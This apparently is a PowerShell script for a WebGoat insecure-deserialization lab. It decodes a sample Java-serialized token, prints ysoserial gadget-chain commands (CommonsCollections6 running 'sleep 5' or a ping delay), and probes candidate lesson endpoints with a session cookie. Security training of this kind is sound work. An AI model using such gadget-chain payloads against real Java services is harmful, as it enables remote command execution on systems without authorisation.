# ============================================================
# WebGoat Insecure Deserialization Attack
# ============================================================
# Goal: Create a serialized object that causes a 5-second delay
# ============================================================

$webGoatUrl = "http://192.168.254.112:8001"
$sessionCookie = "25A6B220A4CB5215EBBE7B31E207B4B1"

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Deserialization Attack" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# First, let's decode the original base64 to see what it contains
$originalBase64 = "rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l"

Write-Host "[INFO] Decoding original payload..." -ForegroundColor Yellow
$originalBytes = [System.Convert]::FromBase64String($originalBase64)
$originalHex = [System.BitConverter]::ToString($originalBytes) -replace '-', ' '

Write-Host "Original hex dump:" -ForegroundColor White
Write-Host $originalHex -ForegroundColor Gray
Write-Host ""

# Try to decode as UTF-8 (skip the Java serialization header)
$stringStart = 7  # Java serialization usually has headers
if ($originalBytes.Length -gt $stringStart) {
    $originalText = [System.Text.Encoding]::UTF8.GetString($originalBytes[$stringStart..($originalBytes.Length-1)])
    Write-Host "Decoded text: $originalText" -ForegroundColor Green
}
Write-Host ""

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Java Serialization Format" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "AC ED 00 05 = Java serialization magic + version" -ForegroundColor White
Write-Host "74 = String object (TC_STRING)" -ForegroundColor White
Write-Host "00 56 = String length (86 bytes)" -ForegroundColor White
Write-Host ""

# The original is just a string. We need to create a malicious object
# that executes a sleep command when deserialized.
# 
# In Java deserialization attacks, we typically use:
# 1. Runtime.getRuntime().exec("sleep 5") - Command execution
# 2. Thread.sleep(5000) - Thread sleep
#
# However, creating a proper Java serialized object requires:
# - Proper class definitions
# - Gadget chains (like Commons Collections, Spring, etc.)
#
# For WebGoat, there's likely a specific gadget chain available.
# Let's try common payloads:

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Generating Payloads" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[INFO] For a 5-second delay, we need to use Java gadget chains" -ForegroundColor Yellow
Write-Host ""
Write-Host "Common approaches:" -ForegroundColor White
Write-Host "1. Use ysoserial tool to generate payload" -ForegroundColor Gray
Write-Host "2. Use specific WebGoat vulnerable classes" -ForegroundColor Gray
Write-Host "3. Create custom serialized object with Thread.sleep()" -ForegroundColor Gray
Write-Host ""

# WebGoat likely has a VulnerableTaskHolder or similar class
# Let's check if there's a hint about which class to use

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "SOLUTION APPROACH" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "You'll need to use 'ysoserial' tool (Java gadget chain generator)" -ForegroundColor White
Write-Host ""
Write-Host "If ysoserial is available, use:" -ForegroundColor Cyan
Write-Host "  java -jar ysoserial.jar CommonsCollections6 'sleep 5' | base64 -w 0" -ForegroundColor Yellow
Write-Host ""
Write-Host "OR for Windows PowerShell:" -ForegroundColor Cyan
Write-Host "  java -jar ysoserial.jar CommonsCollections6 'ping -n 6 127.0.0.1' | base64 -w 0" -ForegroundColor Yellow
Write-Host ""
Write-Host "Alternative gadget chains to try:" -ForegroundColor White
Write-Host "  - CommonsCollections5" -ForegroundColor Gray
Write-Host "  - CommonsCollections6" -ForegroundColor Gray
Write-Host "  - Spring1" -ForegroundColor Gray
Write-Host "  - Spring2" -ForegroundColor Gray
Write-Host ""

# For WebGoat, there might be a simpler approach using their own classes
# Let's create a test payload
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Testing WebGoat Endpoint" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Common WebGoat deserialization endpoint
$endpoint = "/WebGoat/InsecureDeserialization/task"

Write-Host "Trying to find the endpoint..." -ForegroundColor Yellow

$possibleEndpoints = @(
    "/WebGoat/InsecureDeserialization/task",
    "/WebGoat/Deserialization/task",
    "/WebGoat/Deserialization/deserialize",
    "/WebGoat/InsecureDeserialization/deserialize"
)

foreach ($testEndpoint in $possibleEndpoints) {
    Write-Host "  Testing: $testEndpoint" -ForegroundColor Gray
    
    try {
        $headers = @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "Cookie" = "JSESSIONID=$sessionCookie"
        }
        
        $body = "token=$originalBase64"
        
        $response = Invoke-WebRequest `
            -Uri "$webGoatUrl$testEndpoint" `
            -Method POST `
            -Headers $headers `
            -Body $body `
            -UseBasicParsing `
            -TimeoutSec 10 `
            -ErrorAction Stop
        
        Write-Host "    [FOUND] Status: $($response.StatusCode)" -ForegroundColor Green
        Write-Host "    Response: $($response.Content)" -ForegroundColor White
        
        $endpoint = $testEndpoint
        break
        
    } catch {
        if ($_.Exception.Message -match "404") {
            Write-Host "    404 Not Found" -ForegroundColor DarkGray
        } else {
            Write-Host "    Error: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

Write-Host ""
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "Next Steps" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "1. Check the WebGoat lesson page for hints about:" -ForegroundColor White
Write-Host "   - Which Java class to use" -ForegroundColor Gray
Write-Host "   - Available gadget chains" -ForegroundColor Gray
Write-Host "   - Vulnerable classes in the application" -ForegroundColor Gray
Write-Host ""
Write-Host "2. Download ysoserial if not already available:" -ForegroundColor White
Write-Host "   https://github.com/frohoff/ysoserial" -ForegroundColor Cyan
Write-Host ""
Write-Host "3. Or check if WebGoat provides a payload generator" -ForegroundColor White
Write-Host ""

Write-Host "=====================================" -ForegroundColor Cyan
